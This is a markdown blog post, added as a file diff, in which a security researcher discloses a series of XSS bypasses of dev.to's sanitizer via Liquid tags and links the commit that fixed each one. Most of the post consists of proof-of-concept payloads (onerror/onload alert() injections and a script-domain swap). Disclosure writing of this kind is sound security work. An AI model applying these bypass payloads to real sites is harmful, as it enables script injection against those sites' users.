@@ -1,0 +1,145 @@
+---
+title: "Hacking Dev 2: Slipping through security"
+description: "This is my second post regarding multiple XSS I found on dev.to"
+publishDate: 2019-02-05
+updatedDate: 2019-02-05
+tags:
+  - xss
+  - security
+draft: false
+---
+
+Following my last post, [Pwned Together: Hacking dev.to](https://dev.to/antogarand/pwned-together-hacking-devto-hkd), few other security researchers performed security audits of the website, and found other vulnerabilities.
+
+Among them is [Becojo](https://twitter.com/becojo), who found out you could bypass the security filters using Liquid Tags:
+
+> Basically, I can `capture` the output of the gist tag in a variable, and modify it using the `replace` function of liquid tags.
+
+This represents the following:
+
+```mustache
+{% capture the_gist %}
+{% gist https://gist.github.com/username/gist_id %}
+{% endcapture %}
+
+// the_gist now contains the HTML output of the gist tag evaluation
+
+{{ the_gist | replace: "github", "evil" }}
+```
+This would output the given script tag's domain from `gist.github.com/...` to `gist.evil.com/...`, which lets us control the domain of the script tag, giving us an XSS!
+
+# Whack-a-vulnerability
+
+With this knowledge, I started digging into more vulnerabilities which could be caused by liquid tags.
+
+This led me and the dev team to a game of whack-a-mole, where many variants of this vulnerability were found.
+
+## Replace
+
+Firstly, from [my experience navigating the dev source code](https://dev.to/antogarand/what-happens-when-you-submit-an-article-3f8a), I knew that the markdown was rendered before the liquid tags.  
+There are also a list of tags and attributes which are always whitelisted, therefore you can write raw HTML using these and it won't be filtered out:
+
+> [rendered_markdown_scrubber.rb](https://github.com/thepracticaldev/dev.to/blob/master/app/sanitizers/rendered_markdown_scrubber.rb)
+```ruby
+class RenderedMarkdownScrubber < Rails::Html::PermitScrubber
+  def initialize
+    super
+    self.tags = %w(a abbr add aside b blockquote br button center cite code col colgroup dd del dl dt em em figcaption h1 h2 h3 h4 h5 h6 hr i img li ol p pre q rp rt ruby small source span strong sub sup table tbody td tfoot th thead time tr u ul video)
+    self.attributes = %w(alt class colspan data-conversation data-lang data-no-instant data-url em height href id loop name ref rel rowspan size span src start strong title type value width)
+end
+```
+
+With this knowledge, and Liquid Variable Tags, I knew that I could use other tags than [capture](https://help.shopify.com/en/themes/liquid/tags/variable-tags#capture) to get an XSS.
+
+Using the [Assign](https://help.shopify.com/en/themes/liquid/tags/variable-tags#assign) tag, we can achieve a similar result.
+
+```mustache
+{% assign myimg = '<img src="//x" class="alert()"/>' %}
+{{ myimg | replace: "class", "onerror" }}
+```
+
+In this Proof of concept, I replace the `class` attribute with `onerror`, giving us this resulting XSS:
+
+```html
+<img src="//x" onerror="alert()"/>
+```
+
+This was fixed by blocking the major assigning tags, such as `replace`, `replace_first` and `remove` on [this commit](https://github.com/thepracticaldev/dev.to/commit/fab4465bac40f57ec8903f520d0b5610d24413eb).
+
+## Assign
+
+Now that we couldn't use filters, it was time for a different solution.  
+
+By exploiting the assign tag, as Markdown is rendered before liquid tags, we could mix variables and markdown to gain an XSS:
+
+```mustache
+{% assign x = '<pre class="onerror=alert() test"></pre>' %}
+<img src=x class="X {{x}}"/>
+```
+
+Giving us the XSS:
+
+```html
+ <img src=x class="X  <pre class="onerror=alert( ) test"></pre>"/> 
+```
+
+[The solution here](https://github.com/thepracticaldev/dev.to/commit/832e89237368b6a3c01bcbb6a88eaac79d5d3e1f) was to completely remove the capture tags.
+
+## Extracting components
+
+Now that we couldn't have variables, it was time for another bypass!  
+The [replace](https://shopify.github.io/liquid/filters/replace/) filter doc doesn't use a variable, but declares it into the tag itself:
+
+```mustache
+{{ "Take my protein pills and put my helmet on" | replace: "my", "your" }}
+```
+
+We can use the same manipulation, by not using the `assign` tag but directly applying our filter on a div, and using 
+
+```mustache
+{{ '<pre>' | first }}svg onload=alert(1) 
+```
+
+This also uses the `first` filter, which wasn't removed from the last filter-removal commit.
+
+[The patch](https://github.com/thepracticaldev/dev.to/commit/178d0205eb311544718e93625b951095378ccec7) time was pretty simple: Blacklist the `first` tag.  
+
+There were few other filters which were removed since this part, such as `truncate`, `truncateword` and `slice`.
+
+
+## Tag removal
+
+The next bypass I found was by using extra arguments on the default tags, which would be omitted from the HTML yet correctly parse the markdown format check:
+
+```mustache
+<img src="x" class="{%if'1" href="' != '' "> %}
+inner" onerror=alert(document.domain)
+{% endif %}
+```
+In this case, the part between the first `{ %if ... %}` would be removed, giving us the resulting HTML:
+
+
+```html
+<img src="x" class="inner" onerror=alert(document.domain)
+```
+
+This is when they removed all of the default liquid manipulations, such as `if`, `for` and `comment`, which was merged with [the following PR](https://github.com/thepracticaldev/dev.to/pull/608/files).
+
+Finally, I noticed the `raw` tag wasn't disabled with the others. This is because the tag is used internally with the codeblocks, so they can't be blocked as easily as the others.   
+Here is the POC I made back then: 
+
+```mustache
+<img src="x" class="before{% raw %}inside{% endraw ">%}rawafter"onerror=alert(document.domain) 
+```
+Notice the end of the raw tag, containing the end of the `img` tag: `{ % endraw "> %}`
+
+[The final solution](https://github.com/thepracticaldev/dev.to/commit/32ed3ced1144a97264be8a4936a17b4b25f04136) was to block characters after the `raw` keyword, which ensures the block doesn't contain the end of a tag.
+
+# Conclusion
+
+People like me are the reason why you can't have nice things, and also a reason why websites are more secure.
+
+In this case, the fusion of markdown and liquid tags caused some interesting vulnerabilities, even though by themselves these components were (somewhat) secure, the two of them together caused some very interesting vulnerabilities.  
+
+
+As always, please send me your feedback, and follow me on [Twitter](https://twitter.com/AntoGarand) and on dev.to if you want to see more of my content!
